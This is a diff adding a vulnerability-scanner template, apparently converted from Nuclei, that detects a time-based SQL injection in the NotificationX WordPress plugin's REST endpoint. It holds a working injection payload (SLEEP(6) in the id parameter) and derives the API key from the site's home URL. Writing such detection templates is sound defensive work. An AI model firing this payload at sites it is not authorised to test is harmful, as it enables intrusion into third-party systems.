@@ -1,0 +1,139 @@
+{
+  "id": "notificationx-sqli",
+  "name": "NotificationX \u003c 2.3.12 - SQL Injection",
+  "author": "theamanrawat",
+  "severity": "HIGH",
+  "description": "The plugin does not validate and escape the id parameter in its notificationx/v1/notification REST endpoint before using it in a SQL statement, which could allow unauthenticated attackers to perform SQL Injection attacks.\n",
+  "references": [
+    "https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb",
+    "https://wordpress.org/plugins/notificationx/"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "wpscan",
+    "sqli",
+    "wp",
+    "wp-plugin",
+    "wordpress",
+    "notificationx-sql-injection"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /wp-json/ HTTP/1.1\nHost: {{Hostname}}\n",
+        "@timeout: 10s\nGET /wp-json/notificationx/v1/notification/1?api_key\u003d{{md5(\u0027{{apikey}}\u0027)}}\u0026id[1]\u003d%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d6",
+            "status_code \u003d\u003d 401",
+            "contains(content_type, \"application/json\")",
+            "contains(body, \"There is no notification created with this id\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "notificationx-sqli",
+    "info": {
+      "name": "NotificationX \u003c 2.3.12 - SQL Injection",
+      "author": "theamanrawat",
+      "severity": "high",
+      "description": "The plugin does not validate and escape the id parameter in its notificationx/v1/notification REST endpoint before using it in a SQL statement, which could allow unauthenticated attackers to perform SQL Injection attacks.\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb",
+        "https://wordpress.org/plugins/notificationx/"
+      ],
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "time-based-sqli,wpscan,sqli,wp,wp-plugin,wordpress,notificationx-sql-injection"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /wp-json/ HTTP/1.1\nHost: {{Hostname}}\n",
+          "@timeout: 10s\nGET /wp-json/notificationx/v1/notification/1?api_key\u003d{{md5(\u0027{{apikey}}\u0027)}}\u0026id[1]\u003d%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d6",
+              "status_code \u003d\u003d 401",
+              "contains(content_type, \"application/json\")",
+              "contains(body, \"There is no notification created with this id\")"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"home\":\"(.*?)\","
+            ],
+            "group": 1,
+            "name": "apikey",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
